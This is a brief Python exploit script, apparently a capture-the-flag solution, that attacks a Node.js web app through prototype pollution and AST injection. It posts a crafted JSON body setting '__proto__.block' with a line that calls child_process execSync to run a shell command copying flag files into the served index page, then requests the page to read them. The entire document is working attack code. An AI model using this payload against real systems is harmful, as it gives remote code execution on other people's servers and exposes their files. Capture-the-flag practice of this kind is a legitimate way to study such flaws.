#!/usr/bin/python3

import requests

TARGET_URL = '<url of the target>'

#https://blog.p6.is/AST-Injection/

# make pollution
r=requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('cat flag* > views/index.html')"
    }
})
# execute
print(requests.get(TARGET_URL).text)